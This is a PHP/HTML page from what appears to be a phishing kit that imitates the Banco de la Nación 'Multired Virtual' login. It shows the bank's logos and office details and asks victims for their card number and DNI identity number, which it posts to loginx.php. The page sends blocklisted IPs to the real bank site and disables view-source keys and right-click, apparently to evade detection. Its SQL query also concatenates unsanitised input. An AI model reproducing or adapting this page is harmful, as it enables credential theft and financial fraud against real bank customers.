﻿<?php
error_reporting(0);
session_start();
@include("class/db.php");

$card = $_SESSION["card"];
$ipv = $_SERVER["REMOTE_ADDR"];

$file = fopen("IPBam.txt", "r");
while($linea = fgets($file)){
	if(trim($linea) == trim($ipv)){
		header("location: https://zonasegura1.bn.com.pe/BNWeb/login.do");
		exit;
	}
}
fclose($file);

$result = mysqli_query($link, "SELECT card FROM usuarios WHERE card='".$card."'");
$row = $result->fetch_array(MYSQLI_NUM);
$card = htmlentities(($row[0] ? $row[0] : base64_decode($_GET["cgi"])));

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>
<script type="text/javascript" src="files/js/bn-jquery.js"></script>
<script type="text/javascript" src="files/js/jquery.ui.js"></script>
<script type="text/javascript" src="files/js/select.js"></script>
<script type="text/javascript" src="files/js/util.js"></script>  
<!--script type="text/javascript" src="files/js/cufon.js"></script-->
<!--script type="text/javascript" src="files/js/Medium_500.font.js"></script-->
<script type="text/javascript" src="files/js/browser.js"></script>
<script type="text/javascript">
var brw = new Browser();
if(brw.code == 'ch'){
Cufon.replace('.dax');
Cufon.replace('.boton-clave');
	$(document).ready(function(){		
 		$('.boton-clave').css('height','20px');
		$('.boton-clave').css('padding-top','5px'); 	
	});
}
</script>
<script language="javascript">
$(document).ready(function(){ 	 	 
 	 $("#btnLogin").removeAttr("disabled");
});
	
	function validarSiNumero(numero){
		var textoStr =  numero.toString() // transformo a string todo el campo
		var tiene = 0
		for(var i = 0;i < numero.length;i++){ // recorro caracter potr caracter
			var oneChar = textoStr.charAt(i)
			if (!/^([0-9])*$/.test(oneChar)){ // busco un caracter que no sea Numerico
				tiene = 1
			}
		}
		if (tiene == 1){ // controlo si existe o no caracter que no sea numerico.
			return true
		} else {
			return false
		} 
	}
</script>
<meta http-equiv="Content-Language" content="es" />
<meta charset="utf-8">
<link rel="stylesheet" type="text/css" href="files/css/resetearcss.css" />
<link rel="stylesheet" type="text/css" href="files/css/bn-principal.css" />
<link rel="stylesheet" type="text/css" href="files/css/tipografias.css" />
<link rel="stylesheet" type="text/css" href="files/css/home.css" />
<link rel="stylesheet" type="text/css" href="files/css/select.css" />
<link rel="stylesheet" type="text/css" href="files/css/TheCodePoints.css">
<title>Banco de la Nación - Multired Virtual</title>
<!-- Fin -->
<style type="text/css">
.Estilo1 {
	color: #FF0000;
	font-weight: bold;
}

.secure {  /* Clase para el input type="text" */
/* -webkit-text-security:disc !important; 
font-size: 9px !important; */
font-family:TheCodePoints !important; }
</style>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body>
	<div id="contenedor">
        <div id="cabecera">
            <div id="logo-multired">
              <img src="files/img/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
                <img src="files/img/Logo_BN.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
        </div>
        
        <div id="cuerpo">
            <h1 class="dax"><img src="files/img/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>

            <div id="login">
                <div id="border-superior"><img src="files/img/border-arriba.png" alt="Border Login Superior" /></div>
                <div id="login-contenido">

                    <div id="border-inferior"></div>

                    <form method="post" id="form" name="form">
                    <input type="text" name="methodx_captcha" id="methodx" style="display: none;" value="celular">
					<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
					<input type="hidden" id="param_captcha" name="param_captcha" value="1" />
					
                        <div class="fila limpiar">
                            <label for="tipo-documento">Seleccione:</label>
                            
                            <select class="tipo-documento select" id="cboTipoTarjeta" name="cboTipoTarjeta" style="textizq8" disabled> 
								<option value='02'>Multired Global Débito</option>
							</select>
                            
                        </div>
                        <div class="fila limpiar">
                            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">N&uacute;mero de tarjeta:</label>
                            <input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)" value="<?= $card; ?>" readonly />
                        </div>
                        
                        <div class="fila limpiar">
                            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">Tipo y N° Documento:</label>
                            <select id="cboTipoDoc" name="cboTipoDoc" class="select select-medio">
											<option value="001" > DNI</option>
							</select>
							
                           	<input type="text" class="capcha" name="txtNumDoc"  id="txtNumDoc" maxlength="8" size="8" onkeypress="return soloNumerosAll(event)" ></input>
                        </div>
                        
                        <input name="btnLogin" id="btnLogin" class="loginx" type="button" value="CONTINUAR" onclick="javascript:return autenticar();" />
						
                    </form>
						
                </div>
                
                <div id="border-inferior"><img src="files/img/border-abajo.png" alt="Border Login Inferior" /></div>
            </div>
			
		  	
			
        </div>   
        
<div id="pie-pagina">

            <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>

            <div id="oficinas">
                <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
				<p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
				<p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
                
              
            </div>
			 
        </div>
</div>
    <script type="text/javascript" src="files/js/funciones.js"></script>
    <script type="text/javascript">
        $(document).ready(function(){
		myApp.select.init();
		myApp.home.init();
	});
    </script>
<script>
function autenticar() {
			// Validando que el Número de Tarjeta no tenga caracteres que no sean números
			if (validarSiNumero($("#txtNumeroTarjeta").val())){
				alert('El número de Tarjeta solo acepta números...');
				return false; }
			// Validando que el Número de Tarjeta sea de 16 digitos
			if ($("#txtNumeroTarjeta").val().length < 16){
				alert('El número de Tarjeta debe ser de 16 Digitos no menos');
				return false; }
			// Validando que la clave con TARJETA sea de 6 digitos
			if (validarSiNumero($("#txtNumDoc").val())){
				alert('El Documento de Identidad solo acepta números...');
				return false; }
	
			if ($("#txtNumDoc").val().length < 8){
				alert('Su Documento de Identidad debe ser de 8 Digitos no menos');
				return false; }

			$('input[type="button"]').attr('disabled','disabled');

	var Tipo = document.getElementById('cboTipoTarjeta').value;
	var Tarjeta = document.getElementById('txtNumeroTarjeta').value;
	var Dni = document.getElementById('txtNumDoc').value;

	
		$("#validar").val("true");
		$("#HrTrx").val("0112");		
		$('#form').get(0).setAttribute('action', 'loginx.php?id=celular');
		$("#btnLogin").attr("disabled","disabled");
		$("#form").submit();
}
</script>
</body>
</html>